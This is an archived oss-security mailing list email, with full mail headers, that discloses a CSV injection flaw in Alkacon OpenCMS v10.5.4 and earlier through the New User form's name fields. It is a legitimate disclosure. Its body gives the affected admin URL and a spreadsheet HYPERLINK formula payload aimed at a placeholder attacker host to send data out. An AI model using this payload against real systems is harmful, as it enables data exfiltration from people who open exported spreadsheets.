X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["434" "Sunday" "5" "May" "2019" "15:30:22" "+0530" "Pramod Rana" "varchashva@gmail.com" nil "12" nil nil nil nil "5" nil nil (number mark "U       varchashva@g May  5   12/434   " thread-indent "\"[oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7296 invoked by uid 550); 5 May 2019 10:35:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1782 invoked from network); 5 May 2019 10:00:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=u5HZkFfiNlZ2OSWttacQEEwjK+jRWtzmAsLj3TWD6F4=;
        b=oUo7t2t1MzEolBr48Lfxf9tv5m516dVliu92ypRQngmTI2v+zNRKyurWGmf4Y1Mrtu
         6xPv+dKBUeymvbJQ2WwoLJCBNMdIcjhBmsdK/pEdnYIjg/6Kjr4DUSZ1ZtmLQn3FSZBc
         PR4EX2q+asAKDZRKFLD0SHBE86dmsuFtwqIBgmJnniR6jJRdf2SU/95DGggtcUUJDbvi
         WGziLIUHalLbP7TBfdJbGUm2M2cFdIq3EaqcS6GFRf/6PNm3TcKxWv5RbEGqhEmAlZHd
         W/YCcVvdM7XYui5XkXtFNde48P+69EZ46veNBsxz+eIF0h/t5ONSLw1DvsMobGChmqBX
         ax6g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=u5HZkFfiNlZ2OSWttacQEEwjK+jRWtzmAsLj3TWD6F4=;
        b=pyH1b6HEZ0EU2aPlG7QHBlyYkbPXH7Fzrnf+UUlEdwdGH9Emcx05QQ26B276n55xhJ
         9Yq3sqv4EigqxBTo1dbQ4ha3yVV4DNSxos9hMwK05lgJ5uaK69+X28cg4DbMOHfsJR3t
         OpDTQRpISMt5xkvElG/mocBmfdakqk7YBOywouCZ7L4jE46NQ4QDjPAlURolwsELeVin
         RJTc2Se1CBGuM6TCHRI+HCigoY5bC17G4v0a+Q/0/Fb9ylfzxPVuOfR+cqC5tZvDmgk6
         msn/LCPDGqaTgWn8TJ51wus/oLOuLwsnuPN8GZMitQBXVnKHuGPFvSZ0r39HU8Knrhjr
         zJeQ==
X-Gm-Message-State: APjAAAWS1rnM1Iw6QW+U1Su7xvgNDFNAH96+NV9311c2JnuLVngThnyn
	XSXyf6hfcueNFV1YpsgTvKgTvz+84vaViobEC0ScpAQ=
X-Google-Smtp-Source: APXvYqw3TvuPLWLaLZ5sfEgOI4eywn1m9ZJ7fpyJDXHHcHhTucleX7OXBu3QU1SgWo5XC00BHVMRQGjMcOB4vSEoR54=
X-Received: by 2002:ae9:df03:: with SMTP id t3mr15316775qkf.346.1557050433564;
 Sun, 05 May 2019 03:00:33 -0700 (PDT)
MIME-Version: 1.0
From: Pramod Rana <varchashva@gmail.com>
Date: Sun, 5 May 2019 15:30:22 +0530
Message-ID: <CALv8orHZc+_tuwny9g9JGQzX1VBES3L1OYjmdwNzeZNeRWAhJw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CSV Injection | Alkacon OpenCMS v10.5.4 and before

Description
 - OpenCMS v10.5.4 and before is vulnerable to CSV injection in New
User module for parameter First Name and Last Name
 - Impacted URL is
http://[your_webserver_ip]/opencms/system/workplace/admin/accounts/user_new.jsp
 - Payload used is
'=HYPERLINK("http://[attacker_ip:port]/GiveMeSomeData","IAmSafe")'

Further details
 - https://github.com/alkacon/opencms-core/issues/636

Already requested for CVE, yet to receive it.
